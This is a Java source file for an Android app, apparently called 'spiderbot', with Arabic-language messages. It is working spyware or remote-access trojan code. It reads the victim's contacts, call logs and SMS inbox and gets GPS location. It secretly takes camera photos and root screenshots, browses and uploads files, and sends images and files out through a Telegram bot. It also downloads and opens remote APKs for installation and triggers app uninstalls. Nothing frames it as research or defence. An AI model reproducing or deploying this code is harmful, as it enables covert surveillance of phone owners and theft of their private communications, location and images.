package com.spiderbot;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaScannerConnection;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Log;
import androidx.core.app.NotificationManagerCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;
public class DeviceUtils {
    public static String getContacts(Context ctx) {
        StringBuilder sb = new StringBuilder("📞 <b>جهات الاتصال:</b>\n");
        try {
            Cursor c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("👤 ").append(name).append(" — ").append(num).append("\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }
    public static String getCallLogs(Context ctx) {
        StringBuilder sb = new StringBuilder("📋 <b>سجلات المكالمات:</b>\n");
        try {
            Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
                    long dur = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                    long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
                    String typeStr = type == 1 ? "وارد" : type == 2 ? "صادر" : "فات";
                    String contact = (name != null) ? name : num;
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm");
                    sb.append(contact).append(" — ").append(typeStr).append(" ").append(sdf.format(new Date(date))).append(" (").append(dur).append("ث)\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }
    public static String getSMS(Context ctx) {
        StringBuilder sb = new StringBuilder("✉️ <b>الرسائل:</b>\n");
        try {
            Cursor c = ctx.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 30");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    long date = c.getLong(c.getColumnIndex("date"));
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm");
                    sb.append("📩 ").append(addr).append(" — ").append(sdf.format(new Date(date))).append("\n").append(body.length()>80?body.substring(0,80)+"...":body).append("\n\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }
    public static String getDeviceInfo(Context ctx) {
        StringBuilder sb = new StringBuilder("📱 <b>معلومات الجهاز:</b>\n");
        sb.append("الموديل: ").append(Build.MODEL).append("\n");
        sb.append("الشركة: ").append(Build.MANUFACTURER).append("\n");
        sb.append("أندرويد: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("المساحة: ").append(Environment.getExternalStorageDirectory().getTotalSpace()/(1024*1024*1024)).append(" جيجا\n");
        return sb.toString();
    }
    public static void getLocation(Context ctx, LocationCallback cb) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                String url = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
                cb.onResult("📍 الموقع:\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            } else cb.onResult("❌ لا يمكن تحديد الموقع");
        } catch (Exception e) { cb.onResult("خطأ: " + e.getMessage()); }
    }
    public interface LocationCallback { void onResult(String result); }
    public static void takePhoto(Context ctx, boolean front, PhotoCallback cb) {
        try {
            int id = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
            Camera cam = Camera.open(id);
            cam.takePicture(null, null, (data, camera) -> {
                try {
                    File f = new File(ctx.getCacheDir(), "spider_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(data);
                    fos.close();
                    TelegramAPI.sendFile(f, "📸 صورة");
                    cb.onResult(f, "تم");
                } catch (Exception e) { cb.onResult(null, e.getMessage()); }
                camera.release();
            });
        } catch (Exception e) { cb.onResult(null, e.getMessage()); }
    }
    public interface PhotoCallback { void onResult(File file, String msg); }
    public static void takeScreenshot(Context ctx) {
        try {
            Process p = Runtime.getRuntime().exec("su -c screencap -p /sdcard/spider_screen.png");
            p.waitFor();
            File f = new File("/sdcard/spider_screen.png");
            if (f.exists()) TelegramAPI.sendFile(f, "🖥️ لقطة شاشة");
            else TelegramAPI.sendMessage("❌ فشلت لقطة الشاشة (قد تحتاج جذر)");
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }
    public static String listFiles(String path) {
        StringBuilder sb = new StringBuilder("📁 ملفات: " + path + "\n");
        try {
            File dir = new File(path);
            if (!dir.exists()) return "المسار غير موجود";
            File[] files = dir.listFiles();
            if (files != null) for (int i=0; i<Math.min(20,files.length); i++)
                sb.append(files[i].isDirectory() ? "📁 " : "📄 ").append(files[i].getName()).append("\n");
        } catch (Exception e) { sb.append("خطأ"); }
        return sb.toString();
    }
    public static void uploadFile(Context ctx, String path) {
        File f = new File(path);
        if (f.exists() && f.isFile()) TelegramAPI.sendFile(f, "📎 ملف");
        else TelegramAPI.sendMessage("❌ الملف غير موجود");
    }
    public static String getInstalledApps(Context ctx) {
        StringBuilder sb = new StringBuilder("📦 التطبيقات:\n");
        try {
            for (android.content.pm.PackageInfo p : ctx.getPackageManager().getInstalledPackages(0)) {
                sb.append("📱 ").append(p.applicationInfo.loadLabel(ctx.getPackageManager())).append("\n");
                if (sb.length() > 3000) break;
            }
        } catch (Exception e) { sb.append("خطأ"); }
        return sb.toString();
    }
    public static void uninstallApp(Context ctx, String pkg) {
        ctx.startActivity(new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg)).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        TelegramAPI.sendMessage("🗑️ فتح شاشة حذف: " + pkg);
    }
    public static void installApk(Context ctx, String url) {
        TelegramAPI.sendMessage("📥 تحميل APK...");
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.connect();
                File f = new File(ctx.getCacheDir(), "install.apk");
                FileOutputStream fos = new FileOutputStream(f);
                InputStream is = conn.getInputStream();
                byte[] b = new byte[4096];
                int l;
                while ((l = is.read(b)) != -1) fos.write(b, 0, l);
                fos.close(); is.close(); conn.disconnect();
                Intent i = new Intent(Intent.ACTION_VIEW);
                i.setDataAndType(Uri.fromFile(f), "application/vnd.android.package-archive");
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                ctx.startActivity(i);
                TelegramAPI.sendMessage("✅ فتح شاشة التثبيت");
            } catch (Exception e) { TelegramAPI.sendMessage("❌ فشل: " + e.getMessage()); }
        }).start();
    }
    public static void downloadMedia(Context ctx, String url) {
        TelegramAPI.sendMessage("📥 تحميل وسائط...");
        new Thread(() -> {
            try {
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.connect();
                String ext = url.contains(".mp4") ? ".mp4" : ".jpg";
                String name = "spider_" + System.currentTimeMillis() + ext;
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                File f = new File(dir, name);
                FileOutputStream fos = new FileOutputStream(f);
                InputStream is = conn.getInputStream();
                byte[] b = new byte[4096];
                int l;
                while ((l = is.read(b)) != -1) fos.write(b, 0, l);
                fos.close(); is.close(); conn.disconnect();
                MediaScannerConnection.scanFile(ctx, new String[]{f.getAbsolutePath()}, null, null);
                TelegramAPI.sendMessage("✅ تم الحفظ: " + f.getAbsolutePath());
            } catch (Exception e) { TelegramAPI.sendMessage("❌ فشل: " + e.getMessage()); }
        }).start();
    }
}
